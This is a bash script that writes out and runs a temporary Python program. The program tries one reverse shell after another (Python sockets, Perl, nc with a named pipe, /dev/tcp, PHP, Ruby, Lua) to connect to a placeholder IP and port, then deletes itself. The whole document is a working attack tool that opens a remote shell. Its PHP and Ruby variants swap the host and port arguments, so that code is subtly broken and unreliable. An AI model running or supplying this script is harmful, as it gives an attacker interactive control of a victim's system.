#!/bin/bash

# Hardcoded global variables for IP and PORT
IP="127.0.0.1"  # Replace with the desired IP address
PORT=9001         # Replace with the desired port number

PYTHON_SCRIPT=$(mktemp)

cat << 'EOF' > $PYTHON_SCRIPT
import socket
import subprocess
import os

# Hardcoded global variables for IP and PORT
IP = "127.0.0.1"  # Replace with the desired IP address
PORT = 9001         # Replace with the desired port number

def reverse_shell_python(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

def reverse_shell_perl(ip, port):
    perl_script = f"""
    use Socket;
    $i="{ip}";
    $p={port};
    socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    if(connect(S,sockaddr_in($p,inet_aton($i)))){{
        open(STDIN,">&S");
        open(STDOUT,">&S");
        open(STDERR,">&S");
        exec("/bin/sh -i");
    }};
    """
    subprocess.run(['perl', '-e', perl_script])

def reverse_shell_nc(ip, port):
    fifo = "/tmp/f"
    if os.path.exists(fifo):
        os.remove(fifo)
    os.mkfifo(fifo)
    subprocess.Popen(f"cat {fifo}|/bin/sh -i 2>&1|nc {ip} {port} >{fifo}", shell=True)

def reverse_shell_sh(ip, port):
    sh_script = f"/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1"
    subprocess.run(sh_script, shell=True)

def reverse_shell_php(ip, port):
    php_script = f"""
    $sock=fsockopen("{port}","{ip}");
    exec("/bin/sh -i <&3 >&3 2>&3");
    """
    subprocess.run(['php', '-r', php_script])

def reverse_shell_ruby(ip, port):
    ruby_script = f"""
    require 'socket'
    f=TCPSocket.open("{port}","{ip}").to_i
    exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)
    """
    subprocess.run(['ruby', '-e', ruby_script])

def reverse_shell_lua(ip, port):
    lua_script = f"""
    require('socket')
    require('os')
    t=socket.tcp()
    t:connect('{ip}','{port}')
    os.execute('/bin/sh -i <&3 >&3 2>&3')
    """
    subprocess.run(['lua', '-e', lua_script])

if __name__ == "__main__":
    try:
        reverse_shell_python(IP, PORT)
    except Exception:
        pass

    try:
        reverse_shell_perl(IP, PORT)
    except Exception:
        pass

    try:
        reverse_shell_nc(IP, PORT)
    except Exception:
        pass

    try:
        reverse_shell_sh(IP, PORT)
    except Exception:
        pass

    try:
        reverse_shell_php(IP, PORT)
    except Exception:
        pass

    try:
        reverse_shell_ruby(IP, PORT)
    except Exception:
        pass

    try:
        reverse_shell_lua(IP, PORT)
    except Exception:
        pass
EOF

python3 $PYTHON_SCRIPT
rm $PYTHON_SCRIPT
